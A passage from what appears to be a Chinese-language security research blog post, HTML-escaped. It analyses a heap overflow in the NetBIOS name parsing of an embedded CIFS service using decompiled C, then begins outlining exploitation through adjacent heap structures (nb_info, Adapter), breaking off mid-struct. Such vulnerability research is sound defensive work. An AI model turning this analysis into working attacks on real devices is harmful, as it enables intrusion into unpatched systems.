  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndExternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_17:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在上述程式碼&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; 中，該 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; 函式，會去處理 Question 欄位中的名稱，也提供了 buffer 大小給該函式，然而該函式並沒有正確檢查長度，導致複製過多的資料到 netbios_ns_buff 導致 heap overflow&lt;/p&gt;

&lt;p&gt;我們來看一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; 函式&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-24h] BYREF&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;maxlan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ---------- [2]              // it does not subtract the length of &quot;.&quot;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;595&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;從這個函式中，可以看出他在處理 domain name 時，有按照所提供的參數來檢查長度，並且會在每個 label 間加入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;，然而在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; 的部分並沒有去檢查 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; 這個字元的長度，實際上的長度可以比原本的 buffer 還要長，導致 buffer overflow。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;原本以為會需要更詳細去逆向 Heap internal，不過幸運的是，後來發現到 buffer 後面有好用的結構可以利用。&lt;/p&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt; 後，存在一個結構，這邊先命名為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The layout of heap memory:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; :&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;該結構主要用來儲存 NetBIOS 的名稱資訊，而其中也包含另外一個結構，這裡命名為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;，主要儲存該 NetBIOS 的連線資訊。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; :&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Adapter&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1023&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
